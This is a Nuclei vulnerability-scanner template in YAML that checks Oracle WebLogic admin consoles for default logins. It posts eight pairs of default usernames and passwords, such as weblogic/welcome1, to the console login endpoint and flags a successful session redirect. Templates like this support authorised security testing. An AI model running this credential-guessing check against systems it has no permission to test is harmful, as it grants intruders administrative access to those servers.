http:
- attack: pitchfork
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - /console/index.jsp
    - ADMINCONSOLESESSION
  - status:
    - 302
    type: status
  matchers-condition: and
  payloads:
    password:
    - weblogic
    - weblogic1
    - welcome1
    - Oracle@123
    - weblogic123
    - 12345678
    - security
    - password
    username:
    - weblogic
    - weblogic
    - weblogic
    - weblogic
    - weblogic
    - admin
    - admin
    - system
  raw:
  - 'GET /console/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /console/j_security_check HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    j_username={{ username }}&j_password={{ password }}&j_character_encoding=UTF-8

    '
  stop-at-first-match: true
id: weblogic-weak-login
info:
  author: pdteam
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: WebLogic default login credentials were discovered.
  metadata:
    max-request: 16
  name: WebLogic Default Login
  reference:
  - https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password
  - https://www.s-squaresystems.com/weblogic-default-admin-users-password-change/
  severity: high
  tags: default-login,weblogic,vulhub,vuln
